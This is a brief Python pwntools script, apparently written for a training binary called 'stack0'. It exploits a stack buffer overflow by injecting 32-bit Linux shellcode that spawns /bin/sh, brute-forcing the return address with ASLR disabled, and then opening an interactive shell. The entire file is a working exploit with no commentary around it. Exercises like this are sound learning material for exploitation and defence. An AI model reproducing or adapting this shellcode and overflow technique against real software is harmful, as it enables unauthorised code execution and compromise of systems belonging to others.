#inject shellcode
from pwn import *
k=True

shellcode ="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
i=0
while (k):
	try:
		print hex(0xffffd000+i)
		r=process("./stack0",aslr=False,alarm=1)
		r.sendline(shellcode +'A'*(0x5c-len(shellcode)-0x10+0x4)+p32(0xffffd000+i))
		p=r.poll(True)
		print p
		if (p!=-14):
			r.kill()
			i=i+1
		else:
			r.kill()
			r=process("./stack0",aslr=False)
			r.sendline(shellcode +'A'*(0x5c-len(shellcode)-0x10+0x4)+p32(0xffffd000+i))
			r.interactive()
			k=False
	except EOFError as e:
		print "EOFError"
	
